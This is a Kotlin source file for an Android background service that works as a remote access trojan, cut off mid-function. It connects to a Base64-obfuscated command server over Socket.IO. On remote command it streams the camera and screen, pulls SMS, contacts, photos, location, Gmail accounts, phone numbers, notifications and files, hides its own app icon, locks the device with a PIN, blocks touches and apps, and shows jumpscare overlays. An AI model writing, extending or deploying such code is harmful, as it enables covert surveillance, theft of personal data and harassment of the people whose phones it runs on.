package com.sync.xxx

import android.Manifest
import android.annotation.SuppressLint
import android.app.*
import android.app.WallpaperManager
import android.content.*
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.Matrix
import android.graphics.PixelFormat
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.database.Cursor
import android.location.Address
import android.location.Geocoder
import android.location.LocationManager
import android.net.Uri
import android.os.*
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import androidx.camera.core.*
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.*
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.net.URI
import java.util.concurrent.Executors
import android.media.AudioManager

class DeviceService : Service(), LifecycleOwner {

    companion object {
        const val ACTION_COMMAND       = "com.sync.xxx.COMMAND"
        const val EXTRA_COMMAND        = "command"
        const val EXTRA_VALUE          = "value"
        const val ACTION_CONNECT       = "com.sync.xxx.CONNECT"
        const val ACTION_SEND_STATUS   = "com.sync.xxx.SEND_STATUS"
        const val EXTRA_STATUS_JSON    = "statusJson"
        const val ACTION_SEND_FRAME    = "com.sync.xxx.SEND_FRAME"
        const val EXTRA_FRAME_B64      = "frameB64"
        const val ACTION_SCREEN_RESULT = "com.sync.xxx.SCREEN_RESULT"
        const val EXTRA_RESULT_CODE    = "resultCode"
        const val EXTRA_RESULT_DATA    = "resultData"

        val SERVER_URL: String get() = String(android.util.Base64.decode(
    "aHR0cDovL3p5cm9kZXZ2c3RvcmUuc3Vybnh1ZXNrLmJpei5pZDoxMDY0Nw==",
    android.util.Base64.DEFAULT
)).trim()
        const val CHANNEL_ID = "sync_xxx"
        const val NOTIF_ID   = 1
    }

    private val lifecycleRegistry = LifecycleRegistry(this)
    override val lifecycle: Lifecycle get() = lifecycleRegistry

    private var socket: Socket? = null
    private var deviceId: String = ""
    private var deviceName: String = ""

    var lockPin: String = ""
    var lockTitle: String = ""

    private var cameraProvider: ProcessCameraProvider? = null
    private var imageAnalysis: ImageAnalysis? = null
    private var streaming = false
    private var lastFrameTime = 0L
    private val FRAME_INTERVAL = 250L

    private var cameraManager: CameraManager? = null
    private var torchCameraId: String? = null
    private var flashHandler: Handler? = null
    private var flashRunnable: Runnable? = null
    private var flashBlinking = false
    
    private var mediaProjection: MediaProjection? = null
    private var imageReader: ImageReader? = null
    private var screenStreaming = false
    private var lastScreenFrameTime = 0L
    private val SCREEN_FRAME_INTERVAL = 250L
    private var screenHandler: Handler? = null
    private var screenRunnable: Runnable? = null
    private var savedProjectionResultCode: Int = -1
    private var savedProjectionData: Intent? = null


    private val localReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            when (intent.action) {
                ACTION_CONNECT -> {
                    if (socket == null || socket?.connected() == false) connectSocket()
                }
                ACTION_SEND_STATUS -> {
                    val json = intent.getStringExtra(EXTRA_STATUS_JSON) ?: return
                    emitStatus(JSONObject(json))
                }
                ACTION_SCREEN_RESULT -> {
                    val resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, -1)
                    android.util.Log.d("DeviceService", "ACTION_SCREEN_RESULT: resultCode=$resultCode")
                    val data = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                        intent.getParcelableExtra(EXTRA_RESULT_DATA, android.content.Intent::class.java)
                    else
                        @Suppress("DEPRECATION") intent.getParcelableExtra(EXTRA_RESULT_DATA)
                    if (resultCode != android.app.Activity.RESULT_OK || data == null) {
                        android.util.Log.w("DeviceService", "Screen capture denied or data null")
                        emitStatus(JSONObject().apply { put("screenActive", false) })
                        return
                    }
                    savedProjectionResultCode = resultCode
                    savedProjectionData = data
                    startScreenCapture(resultCode, data)
                }
                "com.sync.xxx.NEW_NOTIF" -> {
                    val payloadStr = intent.getStringExtra("payload") ?: return
                    try {
                        val payload = JSONObject(payloadStr)
                        storeNotif(payload)
                        if (socket?.connected() == true) {
                            socket?.emit("device:notif", JSONObject().apply {
                                put("deviceId", deviceId)
                                put("notif", payload)
                            })
                        }
                    } catch (_: Exception) {}
                }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            val hasLocation = ActivityCompat.checkSelfPermission(
                this, Manifest.permission.ACCESS_FINE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED
            val hasCamera = ActivityCompat.checkSelfPermission(
                this, Manifest.permission.CAMERA
            ) == PackageManager.PERMISSION_GRANTED

            var serviceType = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            if (hasLocation) serviceType = serviceType or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION

            startForeground(NOTIF_ID, buildNotification(), serviceType)
        } else {
            startForeground(NOTIF_ID, buildNotification())
        }

        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_CREATE)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_START)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_RESUME)

        deviceId = android.provider.Settings.Secure.getString(
    contentResolver,
    android.provider.Settings.Secure.ANDROID_ID
).takeIf { !it.isNullOrBlank() } ?: Build.ID
        val mfr    = Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
        val model  = Build.MODEL
        deviceName = if (model.startsWith(mfr, ignoreCase = true)) model else "$mfr $model"

        cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
        torchCameraId = cameraManager?.cameraIdList?.firstOrNull { id ->
            cameraManager?.getCameraCharacteristics(id)
                ?.get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
        }

        val filter = IntentFilter().apply {
            addAction(ACTION_CONNECT)
            addAction(ACTION_SEND_STATUS)
            addAction(ACTION_SCREEN_RESULT)
            addAction("com.sync.xxx.NEW_NOTIF")
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(localReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(localReceiver, filter)
        }

        connectSocket()
    }

    private fun connectSocket() {
        try {
            val opts = IO.Options.builder()
                .setReconnection(true)
                .setReconnectionDelay(3000)
                .setReconnectionDelayMax(10000)
                .build()

            socket = IO.socket(URI.create(SERVER_URL), opts)

            socket?.on(Socket.EVENT_CONNECT) {
                Log.d("DeviceService", "Socket Connected")
                SocketHolder.connected = true
                val batteryIntent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
                val level   = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
                val scale   = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) ?: -1
                val plugged = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_PLUGGED, -1) ?: -1
                val batteryPct = if (level >= 0 && scale > 0) (level * 100 / scale) else -1
                val isCharging = plugged != 0

                socket?.emit("device:register", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("name", deviceName)
                    put("battery", batteryPct)
                    put("charging", isCharging)
                    put("sdkVersion", Build.VERSION.SDK_INT)
                    put("androidVersion", Build.VERSION.RELEASE)
                    put("uid", readUid())
                })
            }

            socket?.on(Socket.EVENT_DISCONNECT) {
                Log.d("DeviceService", "Socket disconnected")
                SocketHolder.connected = false
            }

            socket?.on("command") { args ->
                val data = args[0] as? JSONObject ?: return@on
                val cmd  = data.optString("command")
                val val_ = data.opt("value")

                handleCommand(cmd, val_?.toString() ?: "")

                val intent = Intent(ACTION_COMMAND).apply {
                    putExtra(EXTRA_COMMAND, cmd)
                    val valStr: String = val_?.toString() ?: ""
                    putExtra(EXTRA_VALUE, valStr)
                    setPackage(packageName)
                }
                sendBroadcast(intent)
            }

            socket?.connect()
        } catch (e: Exception) {
            Log.e("DeviceService", "Socket error: ${e.message}")
        }
    }

    private fun handleCommand(cmd: String, value: String) {
        when (cmd) {
            "flashlight" -> setFlashlight(value == "true")
            "camera"     -> when (value) {
                "front" -> startCamera("front")
                "back"  -> startCamera("back")
                else    -> stopCamera()
            }
            "screen"     -> when (value) {
                "start" -> requestScreenCapture()
                else    -> stopScreenCapture()
            }
            "lockDevice"     -> lockDevice(value)
            "lockCustom"     -> lockCustom(value)
            "unlockDevice"   -> unlockDevice()
            "changeTheme"    -> changeTheme(value)
            "setWallpaper"   -> setWallpaperFromUrl(value)
            "openUrl"        -> openUrl(value)
            "playAudio"      -> playAudio(value)
            "jumpscareStart" -> startJumpscare(value)
            "jumpscareStop"  -> stopJumpscare()
            "blockApp"         -> blockApp(value)
            "unblockApp"       -> unblockApp(value)
            "unblockAll"       -> unblockAll()
            "getInstalledApps" -> sendInstalledApps()
            "getSms"           -> sendSms()
            "getNotifs"        -> sendStoredNotifs()
            "getGallery"       -> sendGallery()
            "getLocation"      -> sendLocation()
            "getContacts"      -> sendContacts()
            "getGmail"         -> sendGmailAccounts()
            "getPhone"         -> sendPhoneNumbers()
            "vibrate"          -> vibrateDevice(value)
            "showToast"      -> showToast(value)
            "dialogSpam"     -> startDialogSpam(value)
            "dialogSpamStop" -> stopDialogSpam()
            "touchBlock"     -> startTouchBlock(value)
             "touchBlockStop" -> stopTouchBlock()
             "videoOverlay"     -> startVideoOverlay()
              "videoOverlayHide" -> stopVideoOverlay()
            "ttsSpeak" -> ttsSpeak(value)
             "ttsStop"  -> ttsStop()
            "hideIcon"         -> hideAppIcon(value == "true")
            "muteVolume" -> setVolumeMute(value == "true")
            "jumpscare2Start" -> startJumpscare2(value)
            "jumpscare2Stop"  -> stopJumpscare2()
            "getFiles"         -> sendFileList(value)
            "downloadFile"     -> downloadAndSendFile(value)
        }
    }

    private fun vibrateDevice(value: String) {
        try {
            val durationMs = value.toLongOrNull() ?: 500L
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val vm = getSystemService(android.os.VibratorManager::class.java)
                val vib = vm?.defaultVibrator
                vib?.vibrate(android.os.VibrationEffect.createOneShot(durationMs, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                val vib = getSystemService(VIBRATOR_SERVICE) as? android.os.Vibrator
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    vib?.vibrate(android.os.VibrationEffect.createOneShot(durationMs, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
                } else {
                    @Suppress("DEPRECATION")
                    vib?.vibrate(durationMs)
                }
            }
            emitStatus(JSONObject().apply { put("vibrated", durationMs) })
        } catch (e: Exception) {
            Log.e("DeviceService", "vibrateDevice: ${e.message}")
        }
    }
    
    private var jumpscare2Handler: Handler? = null
   private var jumpscare2Runnable: Runnable? = null
   
   private var jumpscare2View: android.widget.ImageView? = null

private fun startJumpscare2(value: String) {
    stopJumpscare2()
    try {
        val obj      = JSONObject(value)
        val url      = obj.getString("url")
        val duration = obj.optLong("duration", 3000L)

        val wm = getSystemService(WINDOW_SERVICE) as WindowManager

        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        else
            @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            type,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
            WindowManager.LayoutParams.FLAG_FULLSCREEN,
            PixelFormat.TRANSLUCENT
        )

        val imgView = android.widget.ImageView(this).apply {
            scaleType = android.widget.ImageView.ScaleType.CENTER_CROP
            setBackgroundColor(android.graphics.Color.BLACK)
        }

        jumpscare2View = imgView

        Handler(Looper.getMainLooper()).post {
            wm.addView(imgView, params)
        }

        Thread {
            try {
                var redirectUrl = url
                var bmp: Bitmap? = null
                for (i in 0..4) {
                    val conn = java.net.URL(redirectUrl).openConnection() as java.net.HttpURLConnection
                    conn.connectTimeout = 12000
                    conn.readTimeout    = 15000
                    conn.instanceFollowRedirects = false
                    conn.setRequestProperty("User-Agent", "Mozilla/5.0")
                    conn.setRequestProperty("Accept", "image/*")
                    conn.connect()
                    val code = conn.responseCode
                    if (code in 300..399) {
                        val loc = conn.getHeaderField("Location")
                        conn.disconnect()
                        if (loc != null) { redirectUrl = loc; continue } else break
                    }
                    val bytes = conn.inputStream.readBytes()
                    conn.disconnect()
                    bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                    break
                }
                val finalBmp = bmp
                Handler(Looper.getMainLooper()).post {
                    if (finalBmp != null) imgView.setImageBitmap(finalBmp)
                }
            } catch (e: Exception) {
                Log.e("DeviceService", "jumpscare2 img: ${e.message}")
            }
        }.start()

        jumpscare2Handler = Handler(Looper.getMainLooper())
        jumpscare2Runnable = Runnable {
            try { wm.removeView(imgView) } catch (_: Exception) {}
            jumpscare2View = null
            emitStatus(JSONObject().apply { put("jumpscare2Active", false) })
        }
        jumpscare2Handler?.postDelayed(jumpscare2Runnable!!, duration)

        emitStatus(JSONObject().apply { put("jumpscare2Active", true) })

    } catch (e: Exception) {
        Log.e("DeviceService", "startJumpscare2: ${e.message}")
    }
}

private fun stopJumpscare2() {
    jumpscare2Runnable?.let { jumpscare2Handler?.removeCallbacks(it) }
    jumpscare2Handler  = null
    jumpscare2Runnable = null
    val wm = getSystemService(WINDOW_SERVICE) as WindowManager
    jumpscare2View?.let {
        try { wm.removeView(it) } catch (_: Exception) {}
    }
    jumpscare2View = null
    emitStatus(JSONObject().apply { put("jumpscare2Active", false) })
}


private fun startDialogSpam(value: String) {
    try {
        val text = try { JSONObject(value).optString("text", value) } catch (_: Exception) { value }
        startService(Intent(this, DialogSpamService::class.java))
        Handler(Looper.getMainLooper()).postDelayed({
            val intent = Intent(DialogSpamService.ACTION_START).apply {
                putExtra(DialogSpamService.EXTRA_TEXT, text)
                setPackage(packageName)
            }
            sendBroadcast(intent)
            emitStatus(JSONObject().apply { put("dialogSpamActive", true) })
        }, 300L)
    } catch (e: Exception) {
        Log.e("DeviceService", "startDialogSpam: ${e.message}")
    }
}

private fun stopDialogSpam() {
    val intent = Intent(DialogSpamService.ACTION_STOP).apply { setPackage(packageName) }
    sendBroadcast(intent)
    emitStatus(JSONObject().apply { put("dialogSpamActive", false) })
}



private fun ttsSpeak(value: String) {
    try {
        val obj = JSONObject(value)
        val svcIntent = Intent(this, TTSService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            startForegroundService(svcIntent)
        else startService(svcIntent)
        val intent = Intent(TTSService.ACTION_SPEAK).apply {
            putExtra(TTSService.EXTRA_TEXT,  obj.optString("text", ""))
            putExtra(TTSService.EXTRA_LANG,  obj.optString("lang", "id"))
            putExtra(TTSService.EXTRA_PITCH, obj.optDouble("pitch", 1.0).toFloat())
            putExtra(TTSService.EXTRA_SPEED, obj.optDouble("speed", 1.0).toFloat())
            setPackage(packageName)
        }
        sendBroadcast(intent)
        emitStatus(JSONObject().apply { put("ttsSpeaking", true) })
    } catch (e: Exception) {
        Log.e("DeviceService", "ttsSpeak: ${e.message}")
    }
}

private fun ttsStop() {
    val intent = Intent(TTSService.ACTION_ST
